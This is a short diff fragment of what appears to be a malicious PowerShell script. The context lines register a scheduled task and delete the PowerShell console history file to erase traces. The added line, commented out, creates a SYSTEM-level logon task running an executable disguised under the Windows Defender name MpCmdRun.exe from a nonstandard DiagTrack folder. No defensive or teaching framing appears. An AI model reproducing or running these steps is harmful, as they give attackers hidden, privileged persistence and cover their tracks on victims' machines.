@@ -106,3 +106,5 @@ Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Pr
 # Clear PowerShell history
 $historyPath = [System.IO.Path]::Combine($env:APPDATA, 'Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt')
 Remove-Item -Path $historyPath
+
+# schtasks /create /tn "RunMpCmdRun" /tr "C:\Windows\DiagTrack\Settings\MpCmdRun.exe" /sc onlogon /ru "SYSTEM"
